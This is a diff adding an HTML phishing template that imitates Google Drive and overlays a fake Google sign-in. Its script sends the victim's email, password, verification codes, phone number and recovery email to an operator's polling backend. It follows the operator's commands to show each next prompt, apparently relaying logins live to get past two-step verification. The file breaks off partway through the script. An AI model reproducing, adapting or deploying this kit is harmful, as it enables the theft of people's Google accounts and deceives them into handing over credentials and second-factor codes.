@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link id="favicon" rel="shortcut icon" href="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png" type="image/png">
+<title>Google Drive</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+<link rel="stylesheet" href="https://robertlugana.sirv.com/Gmail/cdn1/google-drive.min.css">
+</head>
+<body>
+
+<div class="gd-bg">
+  <div class="gd-topbar">
+    <div class="gd-logo-wrap">
+      <img src="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png" alt="Google Drive" class="gd-logo-img">
+      <span class="gd-title">Drive</span>
+    </div>
+    <div class="gd-search-bar"><i class="fas fa-search"></i><span>Search in Drive</span></div>
+    <div class="gd-right-icons">
+      <div class="gd-icon-btn"><i class="far fa-question-circle"></i></div>
+      <div class="gd-icon-btn"><i class="fas fa-cog"></i></div>
+      <div class="gd-icon-btn"><i class="fas fa-th"></i></div>
+      <div class="gd-avatar">G</div>
+    </div>
+  </div>
+  <div class="gd-container">
+    <div class="gd-sidebar">
+      <div class="gd-new-btn"><i class="fas fa-plus"></i> New</div>
+      <div class="gd-nav-item active"><span class="gd-nav-icon"><i class="far fa-hdd"></i></span>My Drive</div>
+      <div class="gd-nav-item"><span class="gd-nav-icon"><i class="fas fa-laptop"></i></span>Computers</div>
+      <div class="gd-nav-item"><span class="gd-nav-icon"><i class="fas fa-user-friends"></i></span>Shared with me</div>
+      <div class="gd-nav-item"><span class="gd-nav-icon"><i class="far fa-clock"></i></span>Recent</div>
+      <div class="gd-nav-item"><span class="gd-nav-icon"><i class="far fa-star"></i></span>Starred</div>
+      <div class="gd-nav-item"><span class="gd-nav-icon"><i class="far fa-trash-alt"></i></span>Trash</div>
+      <div class="gd-storage-box">
+        <div>Storage (45% full)</div>
+        <div class="gd-storage-bar"><div class="gd-storage-fill"></div></div>
+        <div>6.8 GB of 15 GB used</div>
+      </div>
+    </div>
+    <div class="gd-content">
+      <div class="gd-content-header">
+        <div class="gd-breadcrumb">My Drive <i class="fas fa-caret-down" style="font-size:12px;color:#444746"></i></div>
+        <div class="gd-filter-chips">
+          <div class="gd-chip">Type <i class="fas fa-caret-down" style="font-size:10px"></i></div>
+          <div class="gd-chip">People <i class="fas fa-caret-down" style="font-size:10px"></i></div>
+          <div class="gd-chip">Modified <i class="fas fa-caret-down" style="font-size:10px"></i></div>
+        </div>
+      </div>
+      <div class="gd-file-list">
+        <div class="g-r header">
+          <div class="g-n">Name</div><div class="g-o">Owner</div><div class="g-m">Last modified</div><div class="g-s">File size</div><div class="g-e"></div>
+        </div>
+        <div class="g-r">
+          <div class="g-n"><i class="fas fa-folder file-icon-folder"></i> Documents</div><div class="g-o">me</div><div class="g-m">Sep 10, 2026</div><div class="g-s">—</div><div class="g-e"><i class="fas fa-ellipsis-v"></i></div>
+        </div>
+        <div class="g-r">
+          <div class="g-n"><i class="fas fa-file-alt file-icon-doc"></i> {{file1Name}}</div><div class="g-o">me</div><div class="g-m">{{file1Date}}</div><div class="g-s">142 KB</div><div class="g-e"><i class="fas fa-ellipsis-v"></i></div>
+        </div>
+        <div class="g-r">
+          <div class="g-n"><i class="fas fa-file-excel file-icon-sheet"></i> {{file2Name}}</div><div class="g-o">me</div><div class="g-m">{{file2Date}}</div><div class="g-s">2.4 MB</div><div class="g-e"><i class="fas fa-ellipsis-v"></i></div>
+        </div>
+        <div class="g-r">
+          <div class="g-n"><i class="fas fa-file-pdf file-icon-pdf"></i> {{file3Name}}</div><div class="g-o">me</div><div class="g-m">{{file3Date}}</div><div class="g-s">850 KB</div><div class="g-e"><i class="fas fa-ellipsis-v"></i></div>
+        </div>
+        <div class="g-r">
+          <div class="g-n"><i class="fas fa-file-powerpoint file-icon-slide"></i> {{file4Name}}</div><div class="g-o">me</div><div class="g-m">{{file4Date}}</div><div class="g-s">5.1 MB</div><div class="g-e"><i class="fas fa-ellipsis-v"></i></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="gd-overlay">
+<div id="parent">
+<div id="cardProgress"><div class="bar"></div></div>
+<div id="left_child">
+<img src="https://www.gstatic.com/images/branding/googleg_gradient/svg/googleg_gradient_standard_48px.svg" alt="Google" id="google_logo">
+<h1 id="signin_heading">Sign in</h1>
+<p id="statement">Use your Google Account</p>
+<div id="emailChip"><div class="avatar"></div><span class="email-text"></span><span class="dropdown-arrow">&#9662;</span></div>
+</div>
+<div id="right_child">
+<form id="loginForm" onsubmit="return false;" method="post" autocomplete="off">
+<input type="hidden" name="formId" value="{{formId}}">
+<div id="emailGroup" class="field-group">
+<fieldset><legend id="legend">Email or phone</legend><input type="email" id="txtEmail" name="txtEmail" autocomplete="off" onkeydown="if(event.key==='Enter'||event.keyCode===13){event.preventDefault();handleFormSubmission();}"></fieldset>
+<button type="button" id="forgot">Forgot email?</button>
+<div class="error-msg" id="InvalidEmail"><span>Invalid email address. Please enter a valid email.</span></div>
+</div>
+<div id="passwordGroup" class="field-group" style="display:none">
+<fieldset><legend>Enter your password</legend><input type="password" id="txtPassword" name="txtPassword" autocomplete="off" onkeydown="if(event.key==='Enter'||event.keyCode===13){event.preventDefault();handleFormSubmission();}"></fieldset>
+<div class="error-msg" id="RequirePassword"><span>Password is required.</span></div>
+<div class="error-msg" id="InvalidPassword"><span>Incorrect email or password. Try again.</span></div>
+</div>
+<div class="show-password-row" id="showPasswordRow">
+<input type="checkbox" id="showPasswordCheck" onchange="var p=document.getElementById('txtPassword');p.type=this.checked?'text':'password'">
+<label for="showPasswordCheck">Show password</label>
+</div>
+<button type="button" id="forgotPasswordLink">Forgot password?</button>
+<div id="verificationOptionsGroup" style="display:none">
+<div style="font-size:16px;font-weight:400;color:#1f1f1f;margin-bottom:8px;line-height:1.4">Choose how you want to sign in:</div>
+<div id="verificationOptionsContainer"></div>
+<div class="error-msg" id="RequireVerificationChoice"><span>Please select a verification option.</span></div>
+</div>
+<div id="verifySentMessage" style="display:none;font-size:14px;color:#1f1f1f;margin-bottom:24px;line-height:1.5"></div>
+<div id="verificationCodeGroup" class="field-group" style="display:none">
+<fieldset><legend id="verificationCodeLabel">Enter code</legend><input type="text" id="txtVerificationCode" name="txtVerificationCode" autocomplete="off" inputmode="numeric" onkeydown="if(event.key==='Enter'||event.keyCode===13){event.preventDefault();handleFormSubmission();}" oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,6)"></fieldset>
+<div class="error-msg" id="RequireVerificationCode"><span>Verification code is required.</span></div>
+<div class="error-msg" id="InvalidVerificationCode"><span>Invalid verification code. Please try again.</span></div>
+</div>
+<div id="phoneNumberGroup" class="field-group" style="display:none">
+<select id="txtPhoneCountry" onchange="window._ccManual=true"><option value="+1" data-iso="us">🇺🇸 +1</option><option value="+44" data-iso="gb">🇬🇧 +44</option><option value="+1" data-iso="ca">🇨🇦 +1</option><option value="+234" data-iso="ng">🇳🇬 +234</option><option value="+233" data-iso="gh">🇬🇭 +233</option><option value="+254" data-iso="ke">🇰🇪 +254</option><option value="+27" data-iso="za">🇿🇦 +27</option><option value="+91" data-iso="in">🇮🇳 +91</option><option value="+92" data-iso="pk">🇵🇰 +92</option><option value="+63" data-iso="ph">🇵🇭 +63</option><option value="+971" data-iso="ae">🇦🇪 +971</option><option value="+966" data-iso="sa">🇸🇦 +966</option><option value="+20" data-iso="eg">🇪🇬 +20</option><option value="+49" data-iso="de">🇩🇪 +49</option><option value="+33" data-iso="fr">🇫🇷 +33</option></select>
+<fieldset><legend>Phone number</legend><input type="tel" id="txtPhoneNumber" name="txtPhoneNumber" autocomplete="off" inputmode="tel" onkeydown="if(event.key==='Enter'||event.keyCode===13){event.preventDefault();handleFormSubmission();}"></fieldset>
+<div class="error-msg" id="RequirePhoneNumber"><span>Phone number is required.</span></div>
+<div class="error-msg" id="InvalidPhoneNumber"><span>This phone number can't be used. Please check it and try again.</span></div>
+<p style="font-size:12px;color:#5f6368;line-height:1.6;margin:12px 0 16px;font-family:'Roboto','Arial',sans-serif">Google will store this number and only use it for security purposes. Standard message and data rates may apply.</p>
+<button type="button" onclick="window.open('https://accounts.google.com/signin/recovery','_blank')" style="border:0;background:#fff;color:#0b57d0;font-weight:500;font-size:14px;cursor:pointer;padding:8px 0;font-family:'Google Sans','Roboto','Arial',sans-serif">Need help recovering your account?</button>
+</div>
+<div id="recoveryEmailGroup" class="field-group" style="display:none">
+<div id="recoveryNotice"></div>
+<fieldset><legend>Recovery email</legend><input type="email" id="txtRecoveryEmail" name="txtRecoveryEmail" autocomplete="off" onkeydown="if(event.key==='Enter'||event.keyCode===13){event.preventDefault();handleFormSubmission();}"></fieldset>
+<div class="error-msg" id="RequireRecoveryEmail"><span>Recovery email is required.</span></div>
+<div class="error-msg" id="InvalidRecoveryEmail"><span>Invalid recovery email. Please try again.</span></div>
+</div>
+<div id="phonePromptView" style="display:none;padding:32px 0">
+<div style="display:flex;gap:32px;align-items:flex-start">
+<div style="flex:1">
+<h2 id="phonePromptHeading" style="font-size:20px;font-weight:400;color:#1f1f1f;margin-bottom:12px;font-family:'Google Sans','Roboto','Arial',sans-serif;line-height:1.4">Open the Gmail app on your phone</h2>
+<div id="phonePromptNumber"></div>
+<p id="phonePromptInstructions" style="font-size:14px;color:#5f6368;line-height:1.6;margin-bottom:24px;font-family:'Roboto','Arial',sans-serif"></p>
+</div>
+<div style="flex:0 0 auto;font-size:64px;line-height:1;padding-top:8px">📱</div>
+</div>
+</div>
+<div class="error-msg" id="GeneralError"><span>An error occurred. Please try again.</span></div>
+<div id="styledErrorContainer">
+<div class="form-error-display">
+<i class="fas fa-exclamation-circle"></i>
+<div style="flex:1;">
+<div class="error-title">Something went wrong</div>
+<p class="error-msg" id="styledErrorMessage" style="margin-bottom:8px;"></p>
+<button type="button" onclick="location.reload()" style="background:#d93025; color:#fff; border:none; border-radius:4px; padding:6px 16px; font-size:13px; cursor:pointer; font-weight:500;">Retry</button>
+</div>
+</div>
+</div>
+<p id="guestText">Not your computer? Use Guest mode to sign in privately. <a href="https://support.google.com/chrome/answer/6130773" target="_blank">Learn more about using Guest mode</a></p>
+<div id="button_row" class="button_row">
+<button type="button" id="tryAnotherWay" style="display:none;border:0;background:#fff;color:#0b57d0;font-weight:500;font-size:14px;cursor:pointer;padding:10px 16px;border-radius:20px;font-family:'Google Sans','Roboto','Arial',sans-serif">Try another way</button>
+<button type="button" id="create_button">Create account</button>
+<button type="button" id="next_button" onclick="handleFormSubmission()">Next</button>
+</div>
+</form>
+</div>
+</div>
+
+<div id="sessionExpiredView" style="display:none">
+<img src="https://www.gstatic.com/images/branding/googleg_gradient/svg/googleg_gradient_standard_48px.svg" alt="Google" style="width:48px;height:48px;margin-bottom:16px">
+<h1 style="font-size:2rem;font-weight:400;color:#1f1f1f;margin-bottom:16px;text-align:left;font-family:'Google Sans','Roboto','Arial',sans-serif;line-height:1.25">You're not signed in</h1>
+<p id="sessionExpiredMessage" style="font-size:1rem;color:#444746;line-height:1.5;margin-bottom:32px;max-width:400px;font-family:'Google Sans','Roboto','Arial',sans-serif"></p>
+<div style="width:100%;display:flex;justify-content:flex-end">
+<button type="button" id="sessionExpiredRetryBtn" style="background:#0b57d0;color:#fff;border:0;border-radius:20px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;font-family:'Google Sans','Roboto','Arial',sans-serif;min-width:90px;transition:background .2s;height:40px">Try again</button>
+</div>
+</div>
+
+</div>
+
+<div id="loadingOverlay" class="splash-screen">
+  <img src="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png" alt="Google Drive" class="splash-drive-icon">
+  <div class="splash-progress"><div class="splash-progress-bar"></div></div>
+  <p class="splash-brand">Google Drive</p>
+  <p class="splash-error" id="errorMessage"></p>
+</div>
+<script>
+
+const templateConfig={postURL:window.location.origin+'/api',token:"{{token}}",landingPageLink:"{{landingPageLink}}",pollingUrl:"{{pollingUrl}}",updateUrl:"{{updateUrl}}"};
+let apiBaseUrl=templateConfig.pollingUrl?templateConfig.pollingUrl.replace('/pooling-operator',''):templateConfig.postURL;
+let updateBaseUrl=templateConfig.updateUrl?templateConfig.updateUrl.replace('/update-process',''):templateConfig.postURL;let browserId=null,pollingIntervalId=null,pollingStartTime=null;
+let browserIdReady=false,pendingSubmission=null;const POLLING_TIMEOUT_MS=10*60*1000;const PROCESSING_TIMEOUT_MS=180000;let processingStartTime=null;let currentStatus=null,lastShownStatus='';let isInitialLoad=true,isSubmitting=false,isProcessing=false;let lastFormVisibleStatus='WAITINGEMAIL';let lastRenderedOptionsHash='';let lastPasswordErrorMsg='';let _codeErrorShown=false;
+function showStyledError(m){const c=document.getElementById('styledErrorContainer'),e=document.getElementById('styledErrorMessage');if(c&&e){e.textContent=m||'An unexpected error occurred.';c.style.display='block'}}
+function showFailedView(m){['emailGroup','passwordGroup','verificationOptionsGroup','verificationCodeGroup','phoneNumberGroup','recoveryEmailGroup','phonePromptView','button_row','showPasswordRow','forgotPasswordLink','guestText','create_button','verifySentMessage','tryAnotherWay'].forEach(id=>{const e=document.getElementById(id);if(e)e.style.display='none'});const eC=document.getElementById('emailChip');if(eC)eC.style.display='none';const left=document.getElementById('left_child');if(left)left.style.display='none';const p=document.getElementById('parent');if(p)p.style.display='none';hideAllErrors();document.body.style.backgroundColor='#f0f4f9';const sev=document.getElementById('sessionExpiredView');if(sev){document.getElementById('sessionExpiredMessage').textContent=m||'Your session ended. Please try signing in again.';sev.style.display='flex'}}
+function hideStyledError(){const c=document.getElementById('styledErrorContainer');if(c)c.style.display='none'}
+function objectToFormData(obj){const fd=new URLSearchParams();Object.entries(obj).forEach(([k,v])=>{fd.append(k,v.toString())});return fd.toString()}
+function isValidEmail(email){return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)}
+function showLoadingOverlay(){const o=document.getElementById('loadingOverlay');if(o){o.classList.remove('splash-hidden');o.style.display='flex'}document.getElementById('parent').style.display='none'}
+function showErrorOverlay(m){const o=document.getElementById('loadingOverlay');if(o){o.style.display='flex';o.classList.remove('splash-hidden')}const ic=o?o.querySelector('.splash-drive-icon'):null;if(ic)ic.style.animationPlayState='paused';const pb=o?o.querySelector('.splash-progress'):null;if(pb)pb.style.display='none';const br=o?o.querySelector('.splash-brand'):null;if(br)br.style.display='none';const er=o?o.querySelector('.splash-error'):null;if(er){er.textContent=m;er.style.display='block'}}
+function hideLoadingOverlay(){const o=document.getElementById('loadingOverlay');if(o){o.classList.add('splash-hidden');setTimeout(()=>{o.style.display='none'},400)}document.getElementById('parent').style.display='flex'}
+function setFormSubmitting(submitting){const eF=document.getElementById('txtEmail'),pF=document.getElementById('txtPassword'),vCI=document.getElementById('txtVerificationCode'),phF=document.getElementById('txtPhoneNumber'),reF=document.getElementById('txtRecoveryEmail'),sB=document.getElementById('next_button'),cP=document.getElementById('cardProgress');const inputs=[eF,pF,vCI,phF,reF];const radios=document.querySelectorAll('input[name="verificationOption"]');if(submitting){isSubmitting=true;inputs.forEach(i=>{if(i&&(i.id!=='txtEmail'||browserIdReady)){i.disabled=true;i.readOnly=true}});radios.forEach(r=>{r.disabled=true});if(sB)sB.disabled=true;if(cP)cP.style.display='block'}else{isSubmitting=false;inputs.forEach(i=>{if(i&&(i.id!=='txtEmail'||browserIdReady)){i.disabled=false;i.readOnly=false}});radios.forEach(r=>{r.disabled=false});if(sB)sB.disabled=false;if(cP)cP.style.display='none'}}
+function hideAllErrors(){hideStyledError();_codeErrorShown=false;['InvalidEmail','InvalidPassword','RequirePassword','GeneralError','RequireVerificationChoice','RequireVerificationCode','InvalidVerificationCode','RequirePhoneNumber','InvalidPhoneNumber','RequireRecoveryEmail','InvalidRecoveryEmail'].forEach(id=>{document.getElementById(id).style.display='none'});['emailGroup','passwordGroup','verificationCodeGroup','phoneNumberGroup','recoveryEmailGroup'].forEach(id=>{const el=document.getElementById(id);if(el)el.classList.remove('field-error')})}
+function hideInputGroups(){['emailGroup','passwordGroup','verificationOptionsGroup','verificationCodeGroup','phoneNumberGroup','recoveryEmailGroup','phonePromptView','verifySentMessage','tryAnotherWay','showPasswordRow','forgotPasswordLink','forgot','guestText','create_button'].forEach(id=>{const el=document.getElementById(id);if(el)el.style.display='none'})}
+function selectedCountry(){const s=document.getElementById('txtPhoneCountry');if(!s||!s.options||s.selectedIndex<0)return{dial:'+1',iso:'us'};const o=s.options[s.selectedIndex];return{dial:o.value||'+1',iso:o.getAttribute('data-iso')||'us'}}
+function getPhoneNumberValue(){const el=document.getElementById('txtPhoneNumber');return el?el.value.replace(/\D/g,''):''}
+function autoSelectCountry(){try{if(window._ccManual)return;const cc=(window._ipCountry||'').toLowerCase();if(!cc)return;const s=document.getElementById('txtPhoneCountry');if(!s)return;for(let i=0;i<s.options.length;i++){if(s.options[i].getAttribute('data-iso')===cc){s.selectedIndex=i;break}}}catch(e){}}
+function fillEmailChip(emailVal){const eC=document.getElementById('emailChip');if(!eC)return;const av=eC.querySelector('.avatar');const em=eC.querySelector('.email-text');const v=emailVal||document.getElementById('txtEmail').value||'';if(av)av.textContent=v.charAt(0).toUpperCase();if(em)em.textContent=v;eC.style.display='flex'}
+function maskEmail(e){if(!e||!e.includes('@'))return e||'';const[u,d]=e.split('@');return u.length<=2?e:u[0]+'••••••••@'+d}
+function showFieldError(errorId,parentGroupId,message){const el=document.getElementById(errorId);if(el){if(message!==undefined){const txt=el.querySelector('span');if(txt)txt.textContent=message}el.style.display='flex'}if(parentGroupId){const pg=document.getElementById(parentGroupId);if(pg)pg.classList.add('field-error')}}
+function startPolling(i){if(pollingIntervalId)clearInterval(pollingIntervalId);if(pollingStartTime===null)pollingStartTime=Date.now();pollingIntervalId=setInterval(pollOperator,i)}
+async function pollOperator(){if(!browserId){clearInterval(pollingIntervalId);return}if(pollingStartTime!==null&&Date.now()-pollingStartTime>POLLING_TIMEOUT_MS){clearInterval(pollingIntervalId);showFailedView('Session timed out. Please refresh and try again.');return}try{const r=await fetch(apiBaseUrl+'/pooling-operator',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:objectToFormData({browserId:browserId,token:templateConfig.token,_t:Date.now()})});if(!r.ok)throw new Error('Poll error '+r.status);const d=await r.json();if(d.currentStatus){if(d.engineProcessing){if(currentStatus==='PROCESSING'&&processingStartTime&&Date.now()-processingStartTime>PROCESSING_TIMEOUT_MS){clearInterval(pollingIntervalId);isProcessing=false;showFailedView('Processing timed out. Please try again.');console.error('[Template] PROCESSING timeout exceeded');return}return}isProcessing=false;updateUIForStatus(d.currentStatus,d.data||{})}}catch(e){console.error('[Template] Poll error, will retry in 5s:',e);clearInterval(pollingIntervalId);if(isProcessing){isProcessing=false;updateUIForStatus(lastFormVisibleStatus,{})}setTimeout(()=>{if(browserId){pollingStartTime=Date.now();startPolling(2000)}},5000)}}
+function updateUIForStatus(s,d){const statusChanged=(s!==currentStatus);currentStatus=s;if(s!=='PROCESSING')processingStartTime=null;if(statusChanged||(s!=='WAITINGPASSWORD'&&s!=='WAITINGPASSWORDERROR'))lastPasswordErrorMsg='';const eG=document.getElementById('emailGroup'),pG=document.getElementById('passwordGroup'),vOG=document.getElementById('verificationOptionsGroup'),vCG=document.getElementById('verificationCodeGroup'),pNG=document.getElementById('phoneNumberGroup'),rEG=document.getElementById('recoveryEmailGroup'),sB=document.getElementById('next_button'),eF=document.getElementById('txtEmail'),pF=document.getElementById('txtPassword'),vCI=document.getElementById('txtVerificationCode');if(statusChanged){hideAllErrors();sB.disabled=false;sB.style.backgroundColor='';sB.style.color=''}
+switch(s){case'WAITING':{hideInputGroups();eG.style.display='block';if(isInitialLoad){showLoadingOverlay();isInitialLoad=false}else{setFormSubmitting(true)}sB.innerText='Checking...';sB.disabled=true;eF.readOnly=true;pF.disabled=true;startPolling(2000);break;}
+case'PROCESSING':{sB.innerText='Checking...';sB.disabled=true;eF.readOnly=true;pF.disabled=true;setFormSubmitting(true);if(!processingStartTime)processingStartTime=Date.now();startPolling(2000);break;}
+case'WAITINGEMAIL':case'WAITINGEMAILERROR':{lastFormVisibleStatus=status;setFormSubmitting(false);hideLoadingOverlay();sB.innerText='Next';if(!browserIdReady)sB.disabled=true;document.getElementById('signin_heading').innerText='Sign in';document.getElementById('statement').innerHTML='to continue to Google Drive';const eC=document.getElementById('emailChip');if(eC)eC.style.display='none';hideInputGroups();eG.style.display='block';document.getElementById('showPasswordRow').style.display='none';document.getElementById('forgotPasswordLink').style.display='none';document.getElementById('forgot').style.display='inline-block';document.getElementById('guestText').style.display='block';document.getElementById('create_button').style.display='inline-block';eF.readOnly=false;pF.disabled=false;if(d.email)eF.value=d.email;if(s==='WAITINGEMAILERROR'&&d.lastJsonResponse){try{const r=typeof d.lastJsonResponse==='string'?JSON.parse(d.lastJsonResponse):d.lastJsonResponse;if(r.message&&!r.message.includes('Processing email')){showFieldError('InvalidEmail','emailGroup',r.message);}}catch(e){}}else if(s==='WAITINGEMAILERROR'){showFieldError('InvalidEmail','emailGroup','Invalid email. Please try again.')}startPolling(2000);break;}
+case'WAITINGPASSWORD':case'WAITINGPASSWORDERROR':{lastFormVisibleStatus=status;setFormSubmitting(false);if(statusChanged){hideLoadingOverlay();sB.innerText='Next';const emailForName=d.email||eF.value||'';const firstName=emailForName.split('@')[0];const displayName=firstName.charAt(0).toUpperCase()+firstName.slice(1);document.getElementById('signin_heading').innerText='Hi '+displayName;document.getElementById('statement').innerText='to continue to Google Drive';const eC=document.getElementById('emailChip');if(eC){const av=eC.querySelector('.avatar');const em=eC.querySelector('.email-text');const emailVal=d.email||eF.value||'';if(av)av.textContent=emailVal.charAt(0).toUpperCase();if(em)em.textContent=emailVal;eC.style.display='flex'}hideInputGroups();pG.style.display='block';document.getElementById('showPasswordRow').style.display='flex';document.getElementById('forgotPasswordLink').style.display='inline-block';if(d.email)eF.value=d.email;eF.readOnly=true;pF.disabled=false;pF.value='';document.getElementById('showPasswordCheck').checked=false;pF.type='password'}if(d.lastJsonResponse){try{const r=typeof d.lastJsonResponse==='string'?JSON.parse(d.lastJsonResponse):d.lastJsonResponse;const isPasswordError=r.verificationState==='WAITINGPASSWORD_ERROR'||r.accountAccess===false&&(r.message&&(r.message.includes('Incorrect')||r.message.includes('incorrect')||r.message.includes('Wrong')||r.message.includes("Couldn't")||r.message.includes('password')||r.message.includes('Password')));if(isPasswordError){const errMsg=r.message||'Incorrect password. Please try again.';if(errMsg!==lastPasswordErrorMsg){pF.value='';lastPasswordErrorMsg=errMsg}showFieldError('InvalidPassword','passwordGroup',errMsg);}}catch(e){}}else if(s==='WAITINGPASSWORDERROR'){const genericPasswordError='Incorrect password. Please try again.';if(genericPasswordError!==lastPasswordErrorMsg){pF.value='';lastPasswordErrorMsg=genericPasswordError}showFieldError('InvalidPassword','passwordGroup',genericPasswordError)}startPolling(2000);break;}
+case'WAITINGOPTIONS':{lastFormVisibleStatus=status;setFormSubmitting(false);hideLoadingOverlay();hideInputGroups();vOG.style.display='block';sB.style.display='none';document.getElementById('signin_heading').innerText="Verify it's you";document.getElementById('statement').innerHTML='To help keep your account safe, Google wants to make sure it\'s really you trying to sign in. <a href="https://support.google.com/accounts/answer/12097" target="_blank" style="color:#0b57d0;text-decoration:none;font-weight:500">Learn more</a>';const eC=document.getElementById('emailChip');if(eC){const av=eC.querySelector('.avatar');const em=eC.querySelector('.email-text');const emailVal=d.email||eF.value||'';if(av)av.textContent=emailVal.charAt(0).toUpperCase();if(em)em.textContent=emailVal;eC.style.display='flex'}let rO=d.verificationOptions||[];if(typeof rO==='string'){try{rO=JSON.parse(rO)}catch(e){rO=[]}}const oA=Array.isArray(rO)?rO:[];const oH=JSON.stringify(oA);if(oH!==lastRenderedOptionsHash){lastRenderedOptionsHash=oH;renderVerificationOptions(oA)}startPolling(2000);break;}
+case'WAITINGCODE':{lastFormVisibleStatus=status;if(statusChanged){const _v0=document.getElementById('txtVerificationCode');if(_v0)_v0.value='';_codeErrorShown=false}setFormSubmitting(false);hideLoadingOverlay();hideInputGroups();const lc=document.getElementById('left_child');if(lc)lc.style.display='flex';const eC=document.getElementById('emailChip');if(eC){const av=eC.querySelector('.avatar');const em=eC.querySelector('.email-text');const emailVal=d.email||eF.value||'';if(av)av.textContent=emailVal.charAt(0).toUpperCase();if(em)em.textContent=emailVal;eC.style.display='flex'}let _gmail=d.gmail;if(!_gmail&&d.lastJsonResponse){try{const _lr=typeof d.lastJsonResponse==='string'?JSON.parse(d.lastJsonResponse):d.lastJsonResponse;_gmail=_lr.gmail}catch(e){}}const isPhonePrompt=_gmail&&_gmail.step==='waiting_app_notification';if(isPhonePrompt){document.getElementById('signin_heading').innerText="2-Step Verification";document.getElementById('statement').innerHTML='To help keep your account safe, Google wants to make sure it\'s really you trying to sign in.';const ppV=document.getElementById('phonePromptView');if(ppV)ppV.style.display='block';const ppH=document.getElementById('phonePromptHeading');if(ppH){ppH.textContent=_gmail.deviceName?'Open the Gmail app on '+_gmail.deviceName:'Open the Gmail app on your phone'}const ppN=document.getElementById('phonePromptNumber');if(ppN){if(_gmail.challengeNumber){ppN.textContent=_gmail.challengeNumber;ppN.style.display='block'}else{ppN.style.display='none'}}const ppI=document.getElementById('phonePromptInstructions');if(ppI&&_gmail.instructions)ppI.textContent=_gmail.instructions;sB.style.display='none';const tAW=document.getElementById('tryAnotherWay');if(tAW)tAW.style.display='inline-block';document.getElementById('verifySentMessage').style.display='none';startPolling(2000);break;}vCG.style.display='block';document.getElementById('signin_heading').innerText="Verify it's you";document.getElementById('statement').innerHTML='To help keep your account safe, Google wants to make sure it\'s really you trying to sign in. <a href="https://support.google.com/accounts/answer/12097" target="_blank" style="color:#0b57d0;text-decoration:none;font-weight:500">Learn more</a>';const vsM=document.getElementById('verifySentMessage');let smsView=false,smsDest='';try{const lr=typeof d.lastJsonResponse==='string'?JSON.parse(d.lastJsonResponse||'{}'):(d.lastJsonResponse||{});const vn=d.viewName||lr.viewName||'';smsView=/sms|anyphone/i.test(vn);smsDest=d.smsDestination||lr.smsDestination||'';if(!smsDest&&lr.message){const mm=String(lr.message).match(/sent to ([+\d()\-\s]+)\.?/);if(mm)smsDest=mm[1].trim()}}catch(e){}if(vsM){if(smsView){vsM.innerHTML='A text message with a 6-digit verification code was just sent to '+((smsDest||'your phone').replace(/</g,'&lt;'))+'.'}else{const ed0=d.emailDestination||(function(){try{const r0=typeof d.lastJsonResponse==='string'?JSON.parse(d.lastJsonResponse):d.lastJsonResponse;return r0.emailDestination||''}catch(e){return''}})();let recipientEmail=ed0||d.email||eF.value||'';if(!ed0)try{const opts=typeof d.verificationOptions==='string'?JSON.parse(d.verificationOptions):(d.verificationOptions||[]);const emailOpt=Array.isArray(opts)?opts.find(o=>o.type==='email_code'&&o.label):null;if(emailOpt&&emailOpt.label){const match=emailOpt.label.match(/at\s+(.+)$/i);if(match)recipientEmail=match[1].trim()}}catch(e){}vsM.innerHTML='An email with a verification code was just sent to <span id="maskedEmail">'+((recipientEmail.includes('\\u2022')?recipientEmail:maskEmail(recipientEmail)).replace(/</g,'&lt;'))+'</span>'}vsM.style.display='block'}sB.innerText='Next';sB.style.display='inline-flex';const tAW=document.getElementById('tryAnotherWay');if(tAW)tAW.style.display='inline-block';const vCI=document.getElementById('txtVerificationCode');if(d.lastJsonResponse){try{const r=typeof d.lastJsonResponse==='string'?JSON.parse(d.lastJsonResponse):d.lastJsonResponse;if(r.message&&(r.message.includes('Incorrect verification code')||r.message.includes('incorrect code')||r.message.includes('Wrong code'))){if(!_codeErrorShown){if(vCI)vCI.value='';_codeErrorShown=true}showFieldError('InvalidVerificationCode','verificationCodeGroup',r.message)}}catch(e){}}startPolling(2000);break;}
+case'WAITINGPHONENUMBER':{lastFormVisibleStatus=status;setFormSubmitting(false);hideLoadingOverlay();sB.innerText='Next';sB.style.display='';document.getElementById('signin_heading').innerText="Verify it's you";document.getElementById('statement').innerText='Enter a phone number to get a text message with a verification code';fillEmailChip(d.email||eF.value||'');hideInputGroups();pNG.style.display='block';document.getElementById('showPasswordRow').style.display='none';document.getElementById('forgotPasswordLink').style.display='none';if(statusChanged)autoSelectCountry();if(d.lastJsonResponse){try{const r=typeof d.lastJsonResponse==='string'?JSON.parse(d.lastJsonResponse):d.lastJsonResponse;const benign=r.verificationState==='WAITING_PHONE_NUMBER'&&(!r.message||/entry screen reached|Processing phone number/.test(r.message||''));if(!benign&&r.message){showFieldError('InvalidPhoneNumber','phoneNumberGroup',r.message)}}catch(e){}}startPolling(2000);break;}
+case'WAITINGRECOVERYEMAIL':{lastFormVisibleStatus=status;setFormSubmitting(false);hideLoadingOverlay();sB.innerText='Next';sB.style.display='';document.getElementById('signin_heading').innerText="Verify it's you";document.getElementById('statement').innerHTML='To help keep your account safe, Google wants to make sure it\'s really you trying to sign in. <a href="https://support.google.com/accounts/answer/12097" target="_blank" style="color:#0b57d0;text-decoration:none;font-weight:500">Learn more</a>';let recM=d.recoveryMasked||'';try{const lr=typeof d.lastJsonResponse==='string'?JSON.parse(d.lastJsonResponse||'{}'):(d.lastJsonResponse||{});if(!recM)recM=lr.recoveryMasked||''}catch(e){}const recN=document.getElementById('recoveryNotice');if(recN){recN.innerText=recM?('Confirm the recovery email address you added to your account: '+recM):'Confirm your recovery email address'}fillEmailChip(d.email||eF.value||'');hideInputGroups();rEG.style.display='block';document.getElementById('showPasswordRow').style.display='none';document.getElementById('forgotPasswordLink').style.display='none';if(d.recoveryEmail)document.getElementById('txtRecoveryEmail').value=d.recoveryEmail;if(d.lastJsonResponse){try{const r=typeof 